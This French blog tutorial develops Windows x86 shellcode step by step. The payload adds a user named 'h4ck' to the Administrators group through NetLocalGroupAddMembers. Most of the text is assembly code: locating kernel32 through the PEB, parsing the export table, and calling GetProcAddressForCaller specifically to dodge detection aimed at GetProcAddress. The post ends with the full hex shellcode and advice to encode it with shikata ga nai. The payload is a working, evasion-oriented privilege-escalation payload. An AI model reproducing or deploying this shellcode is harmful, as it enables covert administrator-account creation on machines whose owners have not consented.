

Cet article présente mon process de développement d'un shellcode. J'imagine que chacun doit avoir ses propres stratégies et fils conducteurs.

Tout d'abord, un shellcode est initialement, et au sens litéral du terme, un bout de code qui affiche un shell. De plus, ce bout de code doit être autonome, c'est-à-dire qu'il ne doit pas avoir de dépendance externe, et donc pas d'IAT (Import Address Table). Le shellcode a besoin d'une structure dans laquelle s'exécuter, car il ne s'agit pas d'un exécutable (dans le sens où la structure du PE -Portable Executable - n'est pas incluse. On ne peut donc pas double-cliquer dessus pour le lancer). Le shellcode vise à être injecté dans un processus en cours par le biais d'un buffer overflow. Son exécution doit donc être indépendante de la position à laquelle il est chargé. Il est donc capable de retrouver les adresses des fonctions dont il a besoin sans faire d'appel direct à ces fontions (pas de **call LoadLibraryA** par exemple, mais plutôt un **call eax**, avec **eax** qui contient l'adresses de**LoadLibraryA()**). De plus, comme le shellcode vise à être injecté dans un processus en cours, souvent par le biais du réseau afin d'avoir un accès distant sur une machine, certains charactère sont interdits, comme par exemple le null byte (__\x00__), le saut de ligne (__\x0A__), ou le retour à la ligne (__\x0D__) . Il est possible que d'autres charactères soient interdits en fonction de l'application ciblée (il faudra les rechercher). Je m'égare, cet article ne traite pas de buffer overflow, mais simplement de la rédaction de shellcode.

J'ai récemment eu besoin d'ajouter un utilisateur à groupe sur ma machine windows. On va donc écrire un shellcode permettant de faire cela. 

Comment ajouter l'utilisateur __h4ck__ au groupe __Administrators__ par exemple? En ligne de commande, cela se passe comme ci-dessous:

```
net localgroup Administrators h4ck /add
```

On peut alors être tenté d'utiliser la fonction __WinExec()__ (https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-winexec) dont le prototype est le suivant:


```
UINT WinExec(
	LPCSTR 	lpCmdLine,
	UINT 	uCmdShow
);
```

et d'utiliser pour l'argument __lpCmdLine__ quelque chose comme:

```
cmd.exe /c net localgroup Administrators h4ck /add
```

Cela fonctionnerait très certainement, mais il est possible que l'utilisation de la commande __net__ soit surveillée, justement parcequ'elle permet d'ajouter/supprimer des utilisateurs/groupes. On va donc passer par un autre mécanisme un peu plus subtil et bien plus intéressant d'un point de vue développement de shellcode. En effet, pour le shellcode que je vais vous présenter, nous aurons besoin d'utiliser des structures, et l'on verra alors comment utiliser des structures en assembleur, et mieux encore en développement de shellcode. On pourra ainsi développer des shellcodes très sophistiqués.

Il existe une fonction de la msdn qui permet d'ajouter un utilisateur à un groupe. Il s'agit de __NetLocalGroupAddMembers()__ (https://docs.microsoft.com/en-us/windows/win32/api/lmaccess/nf-lmaccess-netlocalgroupaddmembers), dont le prototype est le suivant:

```
NET_API_STATUS NET_API_FUNCTION NetLocalGroupAddMembers(
	LPCWSTR servername,
	LPCWSTR groupname,
	DWORD	level,
	LPBYTE	buf,
	DWORD	totalentries
);
```

On observe que le type du paramètre __servername__ et __groupname__ est __LPCWSTR__ (ce qui est différent du type du paramètre __lpCmdLine__ de la fonction __WinExec__ que l'on a vu plus haut et qui est __LPCSTR__). 

En quoi cela est-il important? Le type __LPCSTR__  est l'acronyme de __Long Pointer to a Constant STRing__. Il s'agit donc d'un pointeur vers une chaine de charactère ASCII dans laquelle les charactères sont codés sur __1 byte__. Dans un programme en assembleur cela se traduit comme:

```
 lpCmdLine db "cmd /c net localgroup Administrators h4ck /add", 0
```

En ce qui concerne le type __LPCWSTR__, il s'agit de l'acronyme __Long Pointer to a Constant Wide STRing__. Autrement dit, il faut utiliser de l'__unicode__. En unicode, les charactères sont codés sur __2 bytes__. Ainsi, si le charactère utilisé n'est pas unicode mais ascii, le second byte contient \x00 (ce qui introduit des null bytes ...). Dans un programme en assembleur cela se traduit comme:

```
groupname dw "A", "d", "m", "i", "n", "i", "s", "t", "r", "a", "t", "o", "r", "s", 0
```

On constate le __db__ (**define byte**) et le __dw__ (**define word**), mais aussi le __null byte__ à la fin des chaines de charactères. 

Il est recommandé de lire la msdn de NetLocalGroupAddMembers afin de bien saisir l'importance et l'utilité de tout les paramètres.

<details><summary><font color="red">Ici se trouve le code permettant d'ajouter l'utilisateur __h4ck__ au groupe __Administrators__ en utilisant la fonction __NetLocalGroupAddMembers()__</font></summary>
<p>
```
.586
.model flat, stdcall
 
ExitProcess PROTO STDCALL :DWORD
NetLocalGroupAddMembers PROTO STDCALL :DWORD, :DWORD, :DWORD, :DWORD, :DWORD

LOCALGROUP_MEMBERS_INFO_3 struct
	lgrmi3_domainandname dd ?
LOCALGROUP_MEMBERS_INFO_3 ends

.data
	groupName    dw "A", "d", "m", "i", "n", "i", "s", "t", "r", "a", "t", "o", "r", "s", 0
	buf          dw "h","4","c","k", 0
	lgmi         LOCALGROUP_MEMBERS_INFO_3 <>

.code
Start PROC
	mov       lgmi.lgrmi3_domainandname, offset buf
	
	push      1                          
	push      offset lgmi
	push      3                          
	push      offset groupName          
	push      0                          
	call      NetLocalGroupAddMembers

	xor 	  eax, eax
	push 	  eax
	call 	  ExitProcess
	
Start ENDP
End
```
</p>
</details>

Il n'y a aucun difficulté à comprendre ce code, si ce n'est l'utilisation de la structure __LOCALGROUP\_MEMBERS\_INFO\_3__. Le paramètre __level__ doit contenir un pointeur vers un buffer contenant les données pour le nouveau groupe local (lire la msdn). La structure __LOCALGROUP\_MEMBERS\_INFO\_3__ est la suivante:

```
typedef struct _LOCALGROUP_MEMBERS_INFO_3 {
	LPWSTR lgrmi3_domainandname;
} LOCALGROUP_MEMBERS_INFO_3, *PLOCALGROUP_MEMBERS_INFO_3, *LPLOCALGROUP_MEMBERS_INFO_3;
```

Elle est assez simple, vu qu'elle ne contient qu'un élément, ce sera parfait pour notre shellcode.

__A partir d'ici, on commence le développement du shellcode.__ On va commencer par enlever la section __.data__. Comme on le sait, un shellcode n'est pas un PE, et ne peut donc pas contenir de section.

Il y a plusieur moyen de faire référence à une chaine de charactères. Par exemple, un __jmp__ suivi d'un __call__, comme dans l'exemple ci-dessous:

```
	jmp one
two:
	call myFunction	

one:
	call two
	db "ma string", 0
```

Cela fonctionne car lorsque l'on effectue un __call__, on __push__ sur la stack l'adresse de l'instruction suivante (ici la string). Ainsi l'adresse de "ma string" se retrouve sur la stack. Une autre méthode consiste à mettre directement sur la stack notre string puis à y faire référence comme suit:

```
    mov    esi, esp
    
    push   00007372h ;   sr
    push   6f746172h ; otar
    push   7473696Eh ; tsin
    push   696D6441h ; imdA
    
    mov    [esi], esp
```

On y voit des __null bytes__. Pour y remédier, on aurait pu faire:

```
    mov    esi, esp
    
    xor    eax, eax
    mov    ax, 7372h
    push   eax
    push   6f746172h
    push   7473696Eh
    push   696D6441h
    
    mov    [esi], esp
```

On voit aussi que la string est poussée à l'envers sur la stack pour des raisons de __little\_endien__. Comme l'on joue avec de l'unicode, cela s'écrira alors:

```
    mov    esi, esp
    
    xor    eax, eax
    push   eax
    push   00730072h ; sr
    push   006f0074h ; ot
    push   00610072h ; ar
    push   00740073h ; ts
    push   0069006Eh ; in
    push   0069006Dh ; im
    push   00640041h ; dA
    
    mov    [esi], esp
```

Et l'on peut maintenant écrire notre code en assembleur permettant d'ajouter un utilisateur à un groupe sans utiliser de section __.data__. Il faut simplement faire de la place sur la stack pour stocker les adresses des pointeurs vers les strings. Pour cela, on utilise un __sub esp, 8__:

<details><summary><font color="red">Ici se trouve le code sans la section .data</font></summary>
<p>
```
.586
.model flat, stdcall
 
ExitProcess PROTO STDCALL :DWORD
NetLocalGroupAddMembers PROTO STDCALL :DWORD, :DWORD, :DWORD, :DWORD, :DWORD

.code
Start PROC
	sub    esp, 8
	mov    esi, esp
	
	xor    eax, eax
	push   eax
	push   00730072h ; sr
	push   006f0074h ; ot
	push   00610072h ; ar
	push   00740073h ; ts
	push   0069006Eh ; in
	push   0069006Dh ; im
	push   00640041h ; dA
	mov    [esi], esp
	
	push   eax
	push   006B0063h ; ck
	push   00340068h ; h4
	mov    [esi+4], esp
	
	mov    ecx, [esi+4] ; offset lgmi
	push   ecx
	mov    ecx, esp ; a pointer to a buffer
	
	push   1                          
	push   ecx ; offset lgmi
	push   3                             
	push   [esi] ; offset groupName
	push   0                          
	call   NetLocalGroupAddMembers
	
	xor    eax, eax
	push   eax
	call   ExitProcess

Start ENDP
End
```
</p>
</details>

On voit ici que l'on a remplacé la zone mémoire qui contenait la structure __LOCALGROUP_MEMBERS_INFO_3__ dans la section .data et était __RW__ (Read Write) par une autre zone mémoire qui est toujours __RW__ et qui est la __stack__.

Une autre propriété des shellcodes est qu'ils doivent être autonomes et donc pouvoir trouver par eux mêmes les adresses dont ils ont besoin pour leurs appels de fonctions (ici __call NetLocalGroupAddMembers__ et __call ExitProcess__). 

La fonction __ExitProcess()__ se trouve dans __kernel32.dll__ et la fonction __NetLocalGroupAddMembers()__ se trouve dans __netapi32.dll__. Pour trouver les adresses de ces fonctions, nous allons utiliser le combo __LoadLibray()/GetProcAddress()__ qui permet de charger une librairie et d'y trouver une adresse de fonction.

Pour cela, le shellcode a besoin d'une structure fixe à laquelle il puisse se référer quelque soit la machine sur laquelle il se trouve. La structure qui a ce rôle s'appelle le __TEB__ (Thread Environment Block). Le __TEB__ contient des informations concernant le thread en cours. Chaque thread à donc un __TEB__. Notre shellcode s'executant dans un thread, il est alors possible de se référer à son __TEB__. Pour un thread x86, cette structure est pointé par le segment __FS__ à l'offset __0x00__ (__FS:[0]__). 

Le __TEB__ contient un pointeur pointant vers le __PEB__ (Process Environment Block). Le __PEB__ contient des informations sur le processus en cours. Chaque processus a donc son __PEB__. Le pointeur vers le __PEB__ est situé à l'offset __0x30__ du __TEB__ (__FS:[0x30]__). Si l'on regarde à l'offset __0x0C__ du __PEB__, on y trouve le __LDR__ (il s'agit du LoaDeR de modules) du processus en cours. On peut voir sur les deux figures suivantes comment __windbg__ permet de retrouver ces informations.

![image alt text](/images/shellcode/peb.png)

![image alt text](/images/shellcode/ldr.png)

Le __LDR__ est une structure du type __PEB\_LDR\_DATA__ qui contient notamment la liste des modules (DLLs) chargés en mémoire par ordre de chargement à l'offset __0x1C__. Et enfin, on y trouve par ordre de chargement les adresses des DLLs chargées en mémoire. La première DLL qui est chargée en mémoire est toujours __ntdll.dll__, puis la seconde est toujours __kernel32.dll__. Ainsi, il nous suffit de récupérer l'adresse de kernel32.dll à l'offset __0x08__.

Le code permettant de trouver l'adresse de kernel32.dll est présenté ci-dessous:
```
findKernel32:
       xor 	ecx, ecx
       assume fs:nothing
       add     	ecx, fs:[ecx+30h] ; adresse du PEB dans ecx
       assume fs:error
       mov     	ecx, [ecx+0Ch] ; adresse de PEB_LDR_DATA dans ecx
       mov     	esi, [ecx+1Ch] ; adresse de InInitializationOrderModuleList dans esi
       lodsd           ; load esi into eax
       mov     	eax, [eax+08h] ; adresse de kernel32.dll !!!
```

On va ensuite chercher l'adresse de __GetProcAddress()__ dans kernel32.dll. Pour cela, on va utiliser la même méthode que celle présentée dans l'article https://dokyx.fr/fsdljfhqlsd_bypassav/. Le code a légèrement était modifié afin de prendre en compte la recherche de n'importe quelle fonction dans kernel32.dll. Dans le code de l'article sur le bypass d'antivirus, je ne recherche que la fonction GetProcAddress() pour le POC. Ici, on veut être plus général. De plus, afin d'être à l'ordre du jour, je ne vais pas chercher l'adresse de __GetProcAddress()__, mais celle de __GetProcAddressForCaller()__ afin de contourner les méthodes de détection visant __GetProcAddress()__ (https://www.okta.com/security-blog/2017/07/teaching-shellcode-new-tricks-def-con-25-addition/).

L'adresse de __GetProcAddressForCaller()__ est ensuite stockée dans le registre ESI. Le code permettant cela est présenté ci-dessous:

<details><summary><font color="red">Ici se trouve le code qui permet de trouver l'adresse de GetProcAddressForCaller</font></summary>
<p>
```
.586
.model flat, stdcall
 
ExitProcess PROTO STDCALL :DWORD
NetLocalGroupAddMembers PROTO STDCALL :DWORD, :DWORD, :DWORD, :DWORD, :DWORD

.code
Start PROC
              
        sub    esp, 12
        mov    esi, esp
        ; esi + 0 : groupname
        ; esi + 4 : username
        ; esi + 8 : address kernel32.GetProcAddressForCaller

        push   esi
        jmp    _GetProcAddressForCaller
blop1:
        call   findFunction ; find getProcAddressForCaller
        pop    esi ; this one will get the address of the string 'GetProcAddresForCaller'
	pop    esi
        mov    [esi+8], eax

	push   esi
	jmp    _LoadLibraryA
blop2:
	call   findFunction
        pop    esi ; this one will get the address of the string 'GetProcAddresForCaller'
	pop    esi
        mov    [esi+12], eax

              
	xor    eax, eax
	push   eax
	push   00730072h ; sr
	push   006f0074h ; ot
	push   00610072h ; ar
	push   00740073h ; ts
	push   0069006Eh ; in
	push   0069006Dh ; im
	push   00640041h ; dA
	mov    [esi], esp
	
	push   eax
	push   006B0063h ; ck
	push   00340068h ; h4
	mov    [esi+4], esp

        mov    ecx, [esi+4] ; offset lgmi
        push   ecx
        mov    ecx, esp ; a pointer to a buffer

        push   1                          
        push   ecx ; offset lgmi
	push   3                             
        push   [esi] ; offset groupName
	push   0                          
        call   NetLocalGroupAddMembers

        xor    eax, eax
        push   eax
        call   ExitProcess

findFunction:
       xor     ecx, ecx
       assume fs:nothing
       add     ecx, fs:[ecx+30h] ; adresse du PEB dans ecx
       assume fs:error
       mov     ecx, [ecx+0Ch] ; adresse de PEB_LDR_DATA dans ecx
       mov     esi, [ecx+1Ch] ; adresse de InInitializationOrderModuleList dans esi
       lodsd           ; load esi into eax
       mov     eax, [eax+08h] ; adresse de kernel32.dll !!!

findEDT:  ; find Export Directory Table
       mov     ebx, [eax+03Ch] ; eax = offset signature PE dans Kernel32 
       mov     ebx, [eax+ebx+078h] ; ebx = offset Export Directory Table dans Kernel32 
       add     ebx, eax ; adresse de Export Directory Table dans ebx
       mov     edx, eax

findGPA: ; find GetProcAddress
       mov     ecx, [ebx+18h] ; ecx = nbre de fonctions exportées (compteur) 
       mov     eax, [ebx+20h] ; eax = Offset Export Name Pointer Table dans Kernel32 
       add     eax, edx ; adresse de Export Name Pointer Table dans eax

parseENPT: ; parcourt Export Name Pointer Table
       dec     ecx ; decremente le compte nombre exports push offset func\_GetProcAddress 
       cmp     al, al
       mov     edi, [esp+4] ; contient 'GetProcAddressForCaller' or 'LoadLibraryA' or .. 
       mov     esi, [eax+ecx*4] ; esi = ordinal 'NomFonction\n' dans Name Pointer Table 
       add     esi, edx ; esi = adresse 'NomFonction\n' dans Name Pointer Table 
       push    ecx ; sauvegarde ecx 
       xor     ecx, ecx 
       add     cl, 23d; ecx = nbre charactères dans GetProcAddressForCaller 
       repe    cmpsb ; compare chaines edi et esi 
       pop     ecx ; ecx = compteur nombre exports 
       jnz     parseENPT 
       mov     eax, [ebx+024h] ; eax = offset Ordinal Table dans Kernel32 
       add     eax, edx ; eax = adresse Ordinal Table 
       mov     cx, [eax+ecx*2] ; cx = ordinal de la fonction - numéro du 1er ordinal 
       mov     ax, [ebx+010h] ; eax = numéro du premier ordinal de la table 
       add     cx, ax ; cx = ordinal de la fonction 
       dec     cx ; pour tomber juste (ordinal débute à 0) 
       mov     eax, [ebx+01Ch] ; eax = offset Export Address Table 
       add     eax, edx ; eax = adresse Export Address Table 
       mov     eax, [eax+ecx*4] ; eax = offset de GetProcAddress dans Kernel32 
       add     eax, edx ; eax = adresse GetProcAddress

       ret

_GetProcAddressForCaller:
       call   blop1
       db     'GetProcAddressForCaller', 0

_LoadLibraryA:
       call   blop2
       db     'LoadLibraryA', 0

Start ENDP
End
```
</p>
</details>

Pour utiliser __GetProcAddressForCaller()__ à la place de __GetProcAddress()__, il suffit de rajouter un 0 comme argument supplémentaire.

```
GetProcAddress('DLL handle', 'API string')
GetProcAddresForCaller('DLL handle', 'API string', 0)
```

Il reste à trouver l'adresse de __LoadLibraryA()__ selon le même principe. Il faut penser à augmenter la taille du buffer qui sert à stocker les adresses (en début de shellcode):

```
        sub    esp, 16
        mov    esi, esp
        ; esi + 0 : groupname
        ; esi + 4 : username
        ; esi + 8 : address kernel32.GetProcAddressForCaller
        ; esi + 12 : address kernel32.LoadLibraryA
```

Le code permettant d'ajouter la recherche de __LoadLibraryA()__ diffère peu. Le point important est dans l'instruction __add cl, 23d__ qu'il a fallut modifier en __add cl, 12d__. En effet cette instruction permet d'avoir dans le registre __cl__ la taille de la string à comparer. __GetProcAddressForCaller__ contient 23 charactères tandis que __LoadLibraryA__ n'en contient que 12. Il faut alors volontairement discriminer GetProcAddressForCaller avec 12 charactères seulement, à moins de pousser sur la stack la taille des 2 chaines de charactères, ce qui alourdirais le shellcode. Ce n'est pour le moment pas un problème car il n'y a pas de fonction dans kernel32.dll qui commence par __GetProcAddre__ et qui pourrait compromettre la recherche de la fonction. Il y a, certes, __GetProcAddress__ qui pourrait matcher, mais comme les fonctions sont lues en ordre contraire de leur offsets dans la DLL, le code va commencer par checker avec __GetProcAddressForCaller__ puis __GetProcAddress__. Il matchera donc sur la première, ce que l'on souhaite.


<details><summary><font color="red">Ici se trouve le code qui permet de trouver l'adresse de GetProcAddressForCaller et LoadLibraryA</font></summary>
<p>
```
.586
.model flat, stdcall
 
ExitProcess PROTO STDCALL :DWORD
NetLocalGroupAddMembers PROTO STDCALL :DWORD, :DWORD, :DWORD, :DWORD, :DWORD

.code
Start PROC
              
        sub    esp, 12
        mov    esi, esp
        ; esi + 0 : groupname
        ; esi + 4 : username
        ; esi + 8 : address kernel32.GetProcAddressForCaller

        push   esi
        jmp    _GetProcAddressForCaller
blop1:
        call   findFunction ; find getProcAddressForCaller
        pop    esi ; this one will get the address of the string 'GetProcAddresForCaller'
	pop    esi
        mov    [esi+8], eax

	push   esi
	jmp    _LoadLibraryA
blop2:
	call   findFunction
        pop    esi ; this one will get the address of the string 'GetProcAddresForCaller'
	pop    esi
        mov    [esi+12], eax

              
	xor    eax, eax
	push   eax
	push   00730072h ; sr
	push   006f0074h ; ot
	push   00610072h ; ar
	push   00740073h ; ts
	push   0069006Eh ; in
	push   0069006Dh ; im
	push   00640041h ; dA
	mov    [esi], esp
	
	push   eax
	push   006B0063h ; ck
	push   00340068h ; h4
	mov    [esi+4], esp

        mov    ecx, [esi+4] ; offset lgmi
        push   ecx
        mov    ecx, esp ; a pointer to a buffer

        push   1                          
        push   ecx ; offset lgmi
	push   3                             
        push   [esi] ; offset groupName
	push   0                          
        call   NetLocalGroupAddMembers

        xor    eax, eax
        push   eax
        call   ExitProcess

findFunction:
       xor     ecx, ecx
       assume fs:nothing
       add     ecx, fs:[ecx+30h] ; adresse du PEB dans ecx
       assume fs:error
       mov     ecx, [ecx+0Ch] ; adresse de PEB_LDR_DATA dans ecx
       mov     esi, [ecx+1Ch] ; adresse de InInitializationOrderModuleList dans esi
       lodsd           ; load esi into eax
       mov     eax, [eax+08h] ; adresse de kernel32.dll !!!

findEDT:  ; find Export Directory Table
       mov     ebx, [eax+03Ch] ; eax = offset signature PE dans Kernel32 
       mov     ebx, [eax+ebx+078h] ; ebx = offset Export Directory Table dans Kernel32 
       add     ebx, eax ; adresse de Export Directory Table dans ebx
       mov     edx, eax

findGPA: ; find GetProcAddress
       mov     ecx, [ebx+18h] ; ecx = nbre de fonctions exportées (compteur) 
       mov     eax, [ebx+20h] ; eax = Offset Export Name Pointer Table dans Kernel32 
       add     eax, edx ; adresse de Export Name Pointer Table dans eax

parseENPT: ; parcourt Export Name Pointer Table
       dec     ecx ; decremente le compte nombre exports push offset func\_GetProcAddress 
       cmp     al, al
       mov     edi, [esp+4] ; contient 'GetProcAddressForCaller' or 'LoadLibraryA' or .. 
       mov     esi, [eax+ecx*4] ; esi = ordinal 'NomFonction\n' dans Name Pointer Table 
       add     esi, edx ; esi = adresse 'NomFonction\n' dans Name Pointer Table 
       push    ecx ; sauvegarde ecx 
       xor     ecx, ecx 
       add     cl, 12d; ecx = nbre charactères dans LoadLibraryA et GetProcAddressForCaller (12 est suffisant pour trouver la bonne fonction)
       repe    cmpsb ; compare chaines edi et esi 
       pop     ecx ; ecx = compteur nombre exports 
       jnz     parseENPT 
       mov     eax, [ebx+024h] ; eax = offset Ordinal Table dans Kernel32 
       add     eax, edx ; eax = adresse Ordinal Table 
       mov     cx, [eax+ecx*2] ; cx = ordinal de la fonction - numéro du 1er ordinal 
       mov     ax, [ebx+010h] ; eax = numéro du premier ordinal de la table 
       add     cx, ax ; cx = ordinal de la fonction 
       dec     cx ; pour tomber juste (ordinal débute à 0) 
       mov     eax, [ebx+01Ch] ; eax = offset Export Address Table 
       add     eax, edx ; eax = adresse Export Address Table 
       mov     eax, [eax+ecx*4] ; eax = offset de GetProcAddress dans Kernel32 
       add     eax, edx ; eax = adresse GetProcAddress

       ret

_GetProcAddressForCaller:
       call    blop1
       db      'GetProcAddressForCaller', 0

_LoadLibraryA:
       call    blop2
       db      'LoadLibraryA', 0

Start ENDP
End
```
</p>
</details>

Maintenant que l'on a les adresses de __LoadLibraryA()__ et de __GetProcAddressForCaller()__, il est possible de retrouver n'importe qu'elle fonction. N'oublions pas que celle qui nous interesse est __NetLocalGroupAddMembers()__ qui se trouve dans la DLL __Netapi32.dll__.

```
              jmp _Netapi32
blop3:
              mov eax,[esi+12]
              call eax ; LoadLibraryA('Netapi32.dll')

              xor ebx, ebx
              push ebx
              jmp _NetLocalGroupAddMembers
blop4:
              push eax
              mov eax, [esi+8]
              call eax ; GetProcAddressForCaller(handle netapi32.dll, 'NetLocalGroupAddMembers', 0)
_Netapi32:
       call   blop3
       db     'Netapi32.dll',0

_NetLocalGroupAddMembers:
       call   blop4
       db     'NetLocalGroupAddMembers', 0
```

Et le code final permettant d'ajouter un utilisateur dans le groupe __Administrators__ sans utiliser de section .data, et en recherchant lui-même les DLLs et fonctions dont il a besoin est présenté ci-dessous:: 

<details><summary><font color="red">Ici se trouve le code qui permet d'utiliser NetLocalGroupAddMembers de manière autonome</font></summary>
<p>
```
.586
.model flat, stdcall

.code
Start PROC
              
        sub    esp, 12
        mov    esi, esp
        ; esi + 0 : groupname
        ; esi + 4 : username
        ; esi + 8 : address kernel32.GetProcAddressForCaller

        push   esi
        jmp    _GetProcAddressForCaller
blop1:
        call   findFunction ; find getProcAddressForCaller
        pop    esi ; this one will get the address of the string 'GetProcAddresForCaller'
	pop    esi
        mov    [esi+8], eax

	push   esi
	jmp    _LoadLibraryA
blop2:
	call   findFunction
        pop    esi ; this one will get the address of the string 'GetProcAddresForCaller'
	pop    esi
        mov    [esi+12], eax

        jmp    _Netapi32
blop3:
        mov    eax,[esi+12]
        call   eax ; LoadLibraryA

        xor    ebx, ebx
        push   ebx
        jmp    _NetLocalGroupAddMembers
blop4:
        push   eax
        mov    eax, [esi+8]
        call   eax ; GetProcAddressForCaller
        mov    ebx, eax

              
	xor    eax, eax
	push   eax
	push   00730072h ; sr
	push   006f0074h ; ot
	push   00610072h ; ar
	push   00740073h ; ts
	push   0069006Eh ; in
	push   0069006Dh ; im
	push   00640041h ; dA
	mov    [esi], esp
	
	push   eax
	push   006B0063h ; ck
	push   00340068h ; h4
	mov    [esi+4], esp

        mov    ecx, [esi+4] ; offset lgmi
        push   ecx
        mov    ecx, esp ; a pointer to a buffer

        push   1                          
        push   ecx ; offset lgmi
	push   3                             
        push   [esi] ; offset groupName
	push   0                          
        call   ebx ; NetLocalGroupAddMembers

findFunction:
       xor     ecx, ecx
       assume fs:nothing
       add     ecx, fs:[ecx+30h] ; adresse du PEB dans ecx
       assume fs:error
       mov     ecx, [ecx+0Ch] ; adresse de PEB_LDR_DATA dans ecx
       mov     esi, [ecx+1Ch] ; adresse de InInitializationOrderModuleList dans esi
       lodsd           ; load esi into eax
       mov     eax, [eax+08h] ; adresse de kernel32.dll !!!

findEDT:  ; find Export Directory Table
       mov     ebx, [eax+03Ch] ; eax = offset signature PE dans Kernel32 
       mov     ebx, [eax+ebx+078h] ; ebx = offset Export Directory Table dans Kernel32 
       add     ebx, eax ; adresse de Export Directory Table dans ebx
       mov     edx, eax

findGPA: ; find GetProcAddress
       mov     ecx, [ebx+18h] ; ecx = nbre de fonctions exportées (compteur) 
       mov     eax, [ebx+20h] ; eax = Offset Export Name Pointer Table dans Kernel32 
       add     eax, edx ; adresse de Export Name Pointer Table dans eax

parseENPT: ; parcourt Export Name Pointer Table
       dec     ecx ; decremente le compte nombre exports push offset func\_GetProcAddress 
       cmp     al, al
       mov     edi, [esp+4] ; contient 'GetProcAddressForCaller' or 'LoadLibraryA' or .. 
       mov     esi, [eax+ecx*4] ; esi = ordinal 'NomFonction\n' dans Name Pointer Table 
       add     esi, edx ; esi = adresse 'NomFonction\n' dans Name Pointer Table 
       push    ecx ; sauvegarde ecx 
       xor     ecx, ecx 
       add     cl, 12d; ecx = nbre charactères dans LoadLibraryA et GetProcAddressForCaller (12 est suffisant pour trouver la bonne fonction)
       repe    cmpsb ; compare chaines edi et esi 
       pop     ecx ; ecx = compteur nombre exports 
       jnz     parseENPT 
       mov     eax, [ebx+024h] ; eax = offset Ordinal Table dans Kernel32 
       add     eax, edx ; eax = adresse Ordinal Table 
       mov     cx, [eax+ecx*2] ; cx = ordinal de la fonction - numéro du 1er ordinal 
       mov     ax, [ebx+010h] ; eax = numéro du premier ordinal de la table 
       add     cx, ax ; cx = ordinal de la fonction 
       dec     cx ; pour tomber juste (ordinal débute à 0) 
       mov     eax, [ebx+01Ch] ; eax = offset Export Address Table 
       add     eax, edx ; eax = adresse Export Address Table 
       mov     eax, [eax+ecx*4] ; eax = offset de GetProcAddress dans Kernel32 
       add     eax, edx ; eax = adresse GetProcAddress

       ret

_GetProcAddressForCaller:
       call    blop1
       db      'GetProcAddressForCaller', 0

_LoadLibraryA:
       call    blop2
       db      'LoadLibraryA', 0

_Netapi32:
       call    blop3
       db      'Netapi32.dll',0

_NetLocalGroupAddMembers:
       call    blop4
       db      'NetLocalGroupAddMembers', 0

Start ENDP
End
```
</p>
</details>

Le shellcode est donc:

```
83EC108BF456E9BF000000E8630000005E5E89460856E9CC000000E8530000005E5E89460CE9CF0000008B460CFFD033DB53E9D4000000508B4608FFD08BD833C050686F0070006862006C0089266A686869007400687500620068690074008966048B4E04518BCC6A01516A03FF366A00FFD333C9640349308B490C8B711CAD8B40088B583C8B5C187803D88BD08B4B188B432003C2493AC08B7C24048B348803F25133C980C10CF3A65975E98B432403C2668B0C48668B43106603C866498B431C03C28B048803C2C3E83CFFFFFF47657450726F6341646472657373466F7243616C6C657200E82FFFFFFF4C6F61644C69627261727941
```

Il est à noter que j'ai enlever la fonction __ExitProcess()__, mais il est tout à fait possible de la rechercher pour quitter le programme correctement, et d'ajouter son adresse dans __[esi+16]__ par exemple, en ayant pris soin d'ajouter de l'espace supplémentaire sur la stack.

On remarque que ce shellcode contient des __null bytes__ qui sont inhérent à la construction des strings. Il y a possibilité de s'en passer en les poussant directement sur la stack comme j'ai pu le faire pour le nom d'utilisateur et le groupe. (A vrai dire j'ai utilisé cette technique du __jmp/call__ pour pousser sur la stack par flemme d'écrire les strings à l'envers ...).

Il restera néanmoins une string qui contiendra des __null bytes__, c'est celle qui contient le groupe car elle est en unicode. Pour cela, il suffit de remplacer les __\x00__ par des __\x90__ par exemple et d'ajouter une boucle qui remplace au runtime les __\x90__ par des __\x00__. Cela est possible car la string est poussée sur la stack qui a les permissions RW. Il existe plusieurs manières de faire cela.

Si des null bytes persistent, il faudra penser à encoder le shellcode avec un encodeurs tout prêt comme __shikata ga nai__ ou bien un encodeur que vous aurez codé pour l'occasion.

Ici s'achève cet article sur l'écriture de shellcode indépendant de la position et autonome. Comme dit au début de l'article, il y a plusieurs manières de faire cela, à vous de vous en inspirer :)
